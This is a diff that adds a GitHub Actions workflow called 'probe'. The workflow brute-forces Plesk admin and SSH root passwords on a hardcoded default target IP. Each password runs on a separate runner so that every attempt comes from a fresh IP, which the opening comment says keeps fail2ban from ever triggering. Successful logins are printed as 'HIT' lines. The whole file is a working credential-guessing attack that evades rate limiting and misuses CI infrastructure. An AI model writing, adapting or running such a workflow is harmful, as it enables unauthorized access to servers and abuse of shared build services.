@@ -1,0 +1,61 @@
+name: probe
+# One password per runner = one fresh IP per attempt = fail2ban never triggers.
+# Pass a JSON array of passwords (<=30) per run. mode: plesk | ssh | both
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target ip'
+        default: '74.208.88.23'
+      mode:
+        description: 'plesk | ssh | both'
+        default: 'both'
+      pws:
+        description: 'JSON array of passwords (<=30)'
+        default: '["admin","admin123","root","root123"]'
+jobs:
+  plesk:
+    if: ${{ inputs.mode == 'plesk' || inputs.mode == 'both' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 30
+      matrix:
+        pw: ${{ fromJSON(inputs.pws) }}
+    steps:
+      - name: plesk probe ${{ matrix.pw }}
+        run: |
+          set +e
+          T="${{ inputs.target }}"
+          rm -f /tmp/cj
+          code=$(curl -sk -m 25 -c /tmp/cj -o /tmp/body -w '%{http_code}' \
+                 -X POST "https://$T:8443/login_up.php3" \
+                 --data-urlencode "login_name=admin" \
+                 --data-urlencode "passwd=${{ matrix.pw }}" \
+                 --data-urlencode "submit_login=" 2>/dev/null)
+          inc=$(grep -ci 'incorrect' /tmp/body 2>/dev/null)
+          sz=$(wc -c < /tmp/body 2>/dev/null)
+          if [ "$code" = "200" ] && [ "$inc" = "0" ] && [ "$sz" -gt 1000 ]; then
+            echo "*** PLESK HIT admin:${{ matrix.pw }} (http=$code size=$sz)"
+          else
+            echo "    miss admin:${{ matrix.pw }} (http=$code incorrect=$inc size=$sz)"
+          fi
+  ssh:
+    if: ${{ inputs.mode == 'ssh' || inputs.mode == 'both' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 30
+      matrix:
+        pw: ${{ fromJSON(inputs.pws) }}
+    steps:
+      - name: ssh probe ${{ matrix.pw }}
+        run: |
+          set +e
+          T="${{ inputs.target }}"
+          sudo apt-get install -y sshpass >/dev/null 2>&1
+          out=$(timeout 25 sshpass -p "${{ matrix.pw }}" ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no root@$T 'echo OK' 2>&1)
+          case "$out" in
+            OK*) echo "*** SSH HIT root:${{ matrix.pw }}";;
+            *)   echo "    miss root:${{ matrix.pw }} ($(echo "$out" | tail -1))";;
+          esac
